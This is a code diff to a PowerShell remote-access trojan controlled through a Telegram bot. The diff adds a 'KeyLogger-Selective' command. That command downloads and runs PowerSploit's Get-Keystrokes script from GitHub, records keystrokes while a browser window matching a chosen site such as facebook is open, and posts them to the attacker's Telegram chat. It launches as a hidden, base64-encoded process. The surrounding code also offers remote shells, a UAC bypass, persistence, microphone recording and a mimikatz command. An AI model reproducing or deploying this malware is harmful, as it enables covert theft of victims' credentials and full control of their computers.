@@ -152,6 +152,7 @@ bot-send -photo $ruta -botkey $botkey -chat_id $chat_id
 
 }
 
+
 function graba-audio { param ($botkey,$chat_id,$segundos)
 IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1").content #### Grabar Audio
 $ruta = $env:USERPROFILE + "\AppData\Local\temp\1"
@@ -229,8 +230,26 @@ $modifica = "" ; set-item $Key $modifica ; Remove-Item $key
 Remove-Item C:\Windows\System32\update.sct; return $texto; break
 }}}
 
+function crea_keylogger { param ($extrae)
+$KeyLogger = '
+function extrae_credenciales {
+$ErrorActionPreference = "SilentlyContinue" ; [string]$botkey = "your_token";[string]$chat_id = "your_chat_id" 
+IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1").content ; $siempre = $true
+function credenciales_web {return (Get-Process MicrosoftEdgeCP,MicrosoftEdge,firefox,chrome,iexplore | Where-Object {$_.MainWindowTitle -like "*your_extrae*"}).id }
+do{ $ruta = $env:USERPROFILE + "\appdata\local\temp\1\" ; if ((Test-Path $ruta) -eq $false) {mkdir $ruta} ; $ruta = $ruta + "log.txt" ; $id = credenciales_web
+if ($id -ne $null ) { Get-Keystrokes -LogPath $ruta -Timeout 1 ; $siempre = $false; sleep -Seconds 30 }
+$datos = gc $ruta ; $datos = $datos | Select-String $Extrae ; $texto = $datos} while ($siempre -eq $true) $extraido = "" ; $i = 0
+foreach ($dato in $datos) { $i = $i + 1 
+$dato = $dato -split "," ; $dato = $dato[0] ; $dato = $dato -replace ''""'',""; $dato = $dato -replace "TypedKey" ; $extraido += $dato -replace ''"'',"" 
+if ($i -eq $datos.Count) {$texto = "Resultado KeyLogger-Selective para your_extrae `n";$extraido = $extraido -replace "<Ctrl><Alt>2", "@"
+$texto += $extraido
+Invoke-Webrequest -uri "https://api.telegram.org/bot$botkey/sendMessage?chat_id=$chat_id&text=$texto" -Method post
+Remove-Item $ruta ;return $extraido}}} extrae_credenciales' ; $keylogger = $KeyLogger -replace "your_chat_id", $chat_id -replace "your_token" , $botkey -replace "your_extrae", $extrae ; return $KeyLogger}
+
+
+
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
- $help = "PSBoTelegram V0.7`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz"
+ $help = "PSBoTelegram V0.8`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz`n[*]/KeyLogger-Selective"
  if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
  if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
@@ -248,6 +267,8 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Persistence") {$texto = "La funcion de persistencia se ejecuta: `n /Persistence On`n /Persistence Off"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Persistence On") {$texto = persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Persistence Off") {$texto = remove-persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/KeyLogger-Selective") {$texto = "Activa un KeyLogger de manera selectiva.`nEjemplo: /KeyLogger-Selective facebook"}
+ if ($comando -like "/KeyLogger-Selective*") {$comando = $comando -replace "/KeyLogger-Selective ",""; $code = (crea_keylogger -extrae $comando);$code = code_a_base64 -code $code; $code = "start-process powershell.exe -ArgumentList -WindowStyle Hidden -E $code"; $texto = "Lanzado Keylogger-Selective" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
  if ($comando -like "/MimiGatoz") {mimigatoz}
 
 }
